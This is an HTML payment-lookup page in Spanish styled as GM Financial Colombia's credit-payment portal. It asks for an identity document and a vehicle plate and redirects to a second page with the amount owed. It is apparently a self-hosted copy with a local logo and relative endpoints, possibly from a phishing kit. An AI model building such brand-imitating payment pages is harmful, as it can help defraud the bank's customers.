<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pago de Crédito - GM Financial</title>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --gm-blue: #0047FF;
            --gm-text: #333333;
            --gm-gray-light: #f2f2f2;
            --gm-gray-border: #cccccc;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body {
            font-family: 'Open Sans', Arial, sans-serif;
            color: var(--gm-text);
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .top-bar { height: 6px; background-color: var(--gm-blue); width: 100%; }
        .header { padding: 15px 20px; display: flex; align-items: center; }
        .header img { height: 35px; object-fit: contain; }
        @media (min-width: 768px) { .header img { height: 45px; } }

        .main-content {
            flex: 1; display: flex; flex-direction: column; align-items: center; padding: 30px 15px;
        }

        .titulo-pago {
            font-size: 16px; font-weight: 400; color: #333; text-align: center; margin-bottom: 25px; line-height: 1.4; padding: 0 10px;
        }
        @media (min-width: 768px) { .titulo-pago { font-size: 18px; margin-bottom: 40px; } }

        .card-pago {
            background-color: var(--gm-gray-light); border: 1px solid #e0e0e0; border-radius: 4px;
            padding: 25px 20px; width: 100%; max-width: 650px; box-shadow: 0 4px 15px rgba(0,0,0,0.05);
        }
        @media (min-width: 768px) { .card-pago { padding: 35px 30px; } }

        .form-group { margin-bottom: 15px; position: relative; display: flex; }

        .input-icon {
            width: 45px; background-color: #e6e6e6; border: 1px solid var(--gm-gray-border); border-right: none;
            border-radius: 4px 0 0 4px; display: flex; align-items: center; justify-content: center; color: #666;
            flex-shrink: 0;
        }

        .input-field {
            flex: 1; padding: 12px 10px; border: 1px solid var(--gm-gray-border); border-left: none; border-right: none;
            font-size: 14px; outline: none; font-family: inherit; background-color: #ffffff; color: #333;
            width: 100%; min-width: 0;
        }
        @media (min-width: 768px) { .input-field { padding: 15px; font-size: 15px; } }
        .input-field::placeholder { color: #999; }

        .input-help {
            width: 45px; background-color: #ffffff; border: 1px solid var(--gm-gray-border); border-left: none;
            border-radius: 0 4px 4px 0; display: flex; align-items: center; justify-content: center; color: #666; 
            font-size: 18px; font-weight: bold; flex-shrink: 0;
        }
        @media (min-width: 768px) { .input-help { width: 50px; font-size: 20px; } }

        .btn-continuar {
            width: 100%; padding: 14px; background-color: var(--gm-blue); color: white; border: none; border-radius: 4px;
            font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: background 0.2s;
        }
        @media (min-width: 768px) { .btn-continuar { padding: 15px; font-size: 18px; } }
        .btn-continuar:hover:not(:disabled) { background-color: #0036cc; }
        .btn-continuar:disabled { background-color: #88aaff; cursor: not-allowed; }

        .alert { padding: 10px 15px; border-radius: 4px; margin-bottom: 20px; font-size: 13px; display: none; text-align: center; }
        .alert.error { background: #fce8e6; color: #c5221f; border: 1px solid #f5c6cb; }
        .alert.show { display: block; }

        .footer {
            background-color: #000000; color: #ffffff; padding: 20px; 
            display: flex; flex-direction: column; align-items: flex-start; gap: 20px;
        }
        @media (min-width: 768px) { 
            .footer { padding: 30px 40px; flex-direction: row; justify-content: space-between; align-items: center; } 
        }

        .footer-left { display: flex; align-items: center; gap: 15px; }
        .sello-vigilado {
            border: 1px solid #fff; padding: 5px 2px; font-size: 8px; text-align: center;
            writing-mode: vertical-rl; transform: rotate(180deg); letter-spacing: 1px; height: 70px; display: flex; justify-content: center;
        }
        @media (min-width: 768px) { .sello-vigilado { font-size: 9px; height: 80px; } }

        .footer-logo-container { display: flex; flex-direction: column; align-items: flex-start; }
        .footer-logo { height: 30px; filter: brightness(0) invert(1); object-fit: contain; }
        @media (min-width: 768px) { .footer-logo { height: 35px; } }
        
        .footer-logo-text { font-size: 9px; color: #cccccc; margin-top: 5px; line-height: 1.2; }
        @media (min-width: 768px) { .footer-logo-text { font-size: 10px; } }

        .footer-right { text-align: left; font-size: 11px; color: #aaaaaa; line-height: 1.6; }
        @media (min-width: 768px) { .footer-right { text-align: right; font-size: 13px; } }
        .footer-right strong { color: #00c98d; font-weight: 600; }

        .spinner {
            display: inline-block; width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.4);
            border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="top-bar"></div>
<div class="header">
    <img src="gm.png" alt="GM Financial" onerror="this.outerHTML='<h2 style=\'color:#0047FF; font-weight:700;\'>gm FINANCIAL</h2>'">
</div>

<div class="main-content">
    <div class="titulo-pago">
        Realiza fácilmente el pago de la cuota de tu<br>crédito
    </div>

    <div class="card-pago">
        <div id="alert-box" class="alert"></div>

        <form id="consultaForm">
            <div class="form-group">
                <div class="input-icon">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                </div>
                <input type="text" id="documento" name="documento" class="input-field" required placeholder="Documento de identidad (Para NIT, no incluir dígito)">
                <div class="input-help">?</div>
            </div>

            <div class="form-group">
                <div class="input-icon">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M18.92 6.01C18.72 5.42 18.16 5 17.5 5h-11c-.66 0-1.21.42-1.42 1.01L3 12v8c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-1h12v1c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-8l-2.08-5.99zM6.5 16c-.83 0-1.5-.67-1.5-1.5S5.67 13 6.5 13s1.5.67 1.5 1.5S7.33 16 6.5 16zm11 0c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zM5 11l1.5-4.5h11L19 11H5z"/></svg>
                </div>
                <input type="text" id="placa" name="placa" class="input-field" required placeholder="Ingresa la placa del vehículo (Sin espacios)" style="text-transform: uppercase;">
                <div class="input-help">?</div>
            </div>

            <button type="submit" id="btnConsultar" class="btn-continuar">
                Continuar
            </button>
        </form>
    </div>
</div>

<div class="footer">
    <div class="footer-left">
        <div class="sello-vigilado">VIGILADO<br>SUPERINTENDENCIA FINANCIERA<br>DE COLOMBIA</div>
        <div class="footer-logo-container">
            <img src="gm.png" alt="GM Financial" class="footer-logo" onerror="this.outerHTML='<h2 style=\'color:#fff; font-weight:700;\'>gm FINANCIAL</h2>'">
            <div class="footer-logo-text">GM Financial Colombia S.A.<br>Compañía de Financiamiento.</div>
        </div>
    </div>
    <div class="footer-right">
        <strong>ZonaPAGOS</strong> es un producto de ZonaVirtual S.A.<br>Copyright ZonaVirtual S.A.
    </div>
</div>

<script>
    document.getElementById('consultaForm').addEventListener('submit', async function(e) {
        e.preventDefault();

        const btn = document.getElementById('btnConsultar');
        const alertBox = document.getElementById('alert-box');
        const doc = document.getElementById('documento').value.trim();
        const placa = document.getElementById('placa').value.trim().toUpperCase();

        if(!doc || !placa) {
            alertBox.textContent = 'Por favor, ingresa el documento y la placa.';
            alertBox.className = 'alert error show';
            return;
        }

        btn.innerHTML = '<span class="spinner"></span> Consultando...';
        btn.disabled = true;
        alertBox.className = 'alert';

        try {
            const response = await fetch('/api/consultar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ documento: doc, placa: placa })
            });

            const data = await response.json();

            if (response.ok && data.estado === 'exitoso') {
                const factura = data.facturas[0];
                const totalNumerico = factura.valorSugerido.replace(/[^0-9]/g, '');
                
                const urlPago = `/index2.html?documento=${encodeURIComponent(doc)}&placa=${encodeURIComponent(placa)}&total=${totalNumerico}&credito=${encodeURIComponent(factura.numeroCredito)}`;
                window.location.href = urlPago;
            } else {
                throw new Error(data.error || 'No se encontraron facturas para este documento y placa.');
            }
        } catch (error) {
            alertBox.textContent = error.message;
            alertBox.className = 'alert error show';
            btn.innerHTML = 'Continuar';
            btn.disabled = false;
        }
    });
</script>

</body>
</html>
